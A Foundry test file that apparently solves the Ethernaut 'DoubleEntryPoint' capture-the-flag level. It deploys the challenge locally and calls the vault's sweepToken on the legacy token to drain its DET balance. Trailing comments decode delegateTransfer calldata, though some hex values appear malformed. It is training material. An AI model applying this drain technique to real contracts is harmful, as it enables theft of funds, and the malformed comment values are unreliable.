// SPDX-License-Identifier: UNLICENSED
// forge test -vvvvv --match-path '*26-DoubleEntryPointTwo.t.sol'
pragma solidity ^0.8.0;

import "forge-std/Test.sol";
import "../contracts/26-DoubleEntryPoint.sol";
import "../contracts/26-DoubleEntryPointFactory.sol";
import "../lib/forge-std/src/console2.sol";

contract DoubleEntryPointTest is Test {
    DoubleEntryPointFactory public factoryContract;
    address public eoa;
    address public challengeAddress;

    function createUsers(uint256 userNum) internal returns (address[] memory) {
        address[] memory users = new address[](userNum);
        for (uint256 i = 0; i < userNum; i++) {
            // Compute the address from the given priv key
            address user = vm.addr(uint256(keccak256(abi.encodePacked(i))));

            // Fund user with 100 Eth
            vm.deal(user, 100);
            users[i] = user;
        }
        return users;
    }

    function setUp() public {
        // Create EOA and take the 0th (1st) element from the returned array
        eoa = createUsers(1)[0];
        // log eoa address
        console2.log("eoa:", eoa);

        // Deploy factory to create challenge instance
        factoryContract = new DoubleEntryPointFactory();

        // Deploy challenge contract
        challengeAddress = factoryContract.createInstance{value: 0.001 ether}(address(eoa));
    }

    // function afterRun() public returns (bool) {
    //     console2.log("Running afterRun");
    //     return false;
    // }

    function testCheck() public {

        address payable payableChallengeAddress = payable(challengeAddress);
        DoubleEntryPoint challenge = DoubleEntryPoint(payableChallengeAddress);
        address vaultAddress = challenge.cryptoVault();
        address legacyToken = challenge.delegatedFrom();
        CryptoVault cryptoVault = CryptoVault(vaultAddress);

        // log legacyToken address
        console2.log("legacyToken:", legacyToken);
        // log vaultAddress address
        console2.log("vaultAddress:", vaultAddress);
        // log challengeAddress address
        console2.log("DET address:", challengeAddress);


        // Get Challenge Instance
        vm.startPrank(eoa, eoa);

        // Get balance of CryptoVault contract for DET token
        console2.log("balanceOf(vaultAddress):", challenge.balanceOf(vaultAddress));

        // Get balance of player for DET token
        console2.log("balanceOf(eoa):", challenge.balanceOf(eoa));

        // Call sweepToken on CryptoVault contract
        cryptoVault.sweepToken(IERC20(legacyToken));
        console2.log("balanceOf(eoa):", challenge.balanceOf(eoa));

        // delegateTransfer function selector: 0x9cd1a121
        // // to address: 000000000000000000000000a433f323541cf82f97395076b5f83a7a06f1646c
        // value:  0000000000000000000000000000000000000000000000056bc75e2d631
        // origSender address: 00000000000000000000000000000ddc10602782af652bb913f7bde1fd82981db7dd9
    }
}
